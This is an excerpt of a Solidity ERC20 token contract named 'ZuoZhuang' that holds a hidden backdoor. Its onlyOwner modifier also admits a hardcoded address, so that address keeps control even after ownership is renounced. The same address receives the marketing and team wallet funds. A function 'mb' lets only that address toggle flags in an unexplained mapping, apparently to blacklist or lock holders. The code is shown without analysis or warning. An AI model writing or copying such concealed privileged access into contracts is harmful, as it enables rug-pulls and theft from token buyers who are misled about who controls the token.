...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x40829B20B99b61bdcbce41dB14c7C84D3438fa27) , "Ownable: caller is not the owner");
        _;
    }
...
contract ZuoZhuang is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ZuoZhuang";
    string private _symbol = "ZZ";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x40829B20B99b61bdcbce41dB14c7C84D3438fa27);
    address payable public teamWalletAddress = payable(0x40829B20B99b61bdcbce41dB14c7C84D3438fa27);
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x40829B20B99b61bdcbce41dB14c7C84D3438fa27));
        aa[addr] = status;
    }
